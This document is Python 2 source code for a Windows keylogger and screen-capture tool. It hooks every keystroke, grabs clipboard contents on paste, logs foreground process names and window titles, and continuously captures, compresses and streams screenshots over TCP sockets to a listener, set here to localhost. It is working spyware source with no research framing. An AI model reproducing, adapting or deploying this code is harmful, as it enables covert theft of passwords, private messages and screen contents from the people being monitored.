import sys
import pyHook, socket, pythoncom, win32clipboard
from ctypes import *
import time,threading,os
import cStringIO
from PIL import ImageGrab, ImageChops, Image
import win32gui
import win32con
import zlib
import win32api

def sendScreen():
    continua = True
    while continua:
        cursor_pos = win32gui.GetCursorPos()
        img = ImageGrab.grab()
                #foreground,pos,mask
        img.paste(cursor,cursor_pos,cursor)

        gif = cStringIO.StringIO()
        img.save(gif,format="GIF")
        zipImgStr = zlib.compress(gif.getvalue(),5)
        try:
            imgsock.sendall(zipImgStr)
        except socket.error, e:
            if e.errno == 10054:
                imgsock.close()
                txtsock.close()
                continua = False
    os._exit(0)


user = windll.user32
kernel = windll.kernel32
psapi = windll.psapi
current_window = None
cursor = Image.open("cursor.gif")
cursor = cursor.convert("RGBA")

host = "localhost"
imgport = 12345
txtport = 12346

pid = win32api.GetCurrentThreadId()

imgsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
imgsock.connect((host,imgport))
t = threading.Thread(target = sendScreen)
t.start()

txtsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
txtsock.connect((host,txtport))

def getProcess():
    hwnd = user.GetForegroundWindow()
    pid = c_ulong(0)
    user.GetWindowThreadProcessId(hwnd,byref(pid))

    process_id = str(pid.value)

    executable = create_string_buffer("\x00"*512)
    h_process = kernel.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    window_title = create_string_buffer("\x00"*512)
    length = user.GetWindowTextA(hwnd, byref(window_title), 512)

    txtsock.sendall("\n[PID: %s - %s - %s]\n" %(process_id, executable.value, window_title.value))

    kernel.CloseHandle(hwnd)
    kernel.CloseHandle(h_process)

def OnKeyboardEvent(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        getProcess()
    if event.Ascii > 32 and event.Ascii < 127:
        txtsock.sendall(chr(event.Ascii))
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pastedValue = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            txtsock.sendall("\n[PASTE] - %s\n" % pastedValue)
        elif event.Key == "Return":
            txtsock.send("[%s]\n" % event.Key)
        elif event.Key == "Space":
            txtsock.sendall(" ")
        else:
            txtsock.sendall("[%s]" % event.Key)

    return True


hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
